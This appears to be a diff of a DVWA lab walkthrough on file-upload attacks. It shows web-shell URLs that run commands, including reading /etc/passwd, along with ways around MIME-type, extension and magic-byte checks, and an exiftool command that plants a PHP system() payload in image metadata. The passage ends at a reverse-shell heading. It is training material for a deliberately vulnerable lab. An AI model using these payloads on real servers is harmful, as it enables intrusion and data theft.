@@ -22,24 +22,34 @@ if(isset($_REQUEST['cmd'])){
 }
 ?>
 Upload it through the form. DVWA stores it at:
+
 http://dvwa/hackable/uploads/shell.php
-Access it:
+
+Access it
+
 http://dvwa/hackable/uploads/shell.php?cmd=whoami
+
 http://dvwa/hackable/uploads/shell.php?cmd=cat /etc/passwd
+
 http://dvwa/hackable/uploads/shell.php?cmd=ls -la /var/www/html
+
+
 Medium Security — MIME Type Bypass
+
 The server checks Content-Type header. Intercept with Burp Suite and change:
+
 Content-Type: application/php  →  Content-Type: image/jpeg
 The server believes it's an image and accepts the file.
-High Security — Extension + Magic Bytes Bypass
-The server checks the file extension and magic bytes (file signature). Bypass by:
 
+High Security — Extension + Magic Bytes Bypass
+
+The server checks the file extension and magic bytes (file signature). Bypass by:
 Double extension: shell.php.jpg (if server uses blacklist, not whitelist)
 Null byte injection (old PHP): shell.php%00.jpg
 Embed PHP in image: Use exiftool to inject PHP into image metadata:
-
 bashexiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
 mv image.jpg shell.php.jpg
+
 Then combine with LFI to execute it.
 Getting a Reverse Shell
 Upload a reverse shell and execute it:
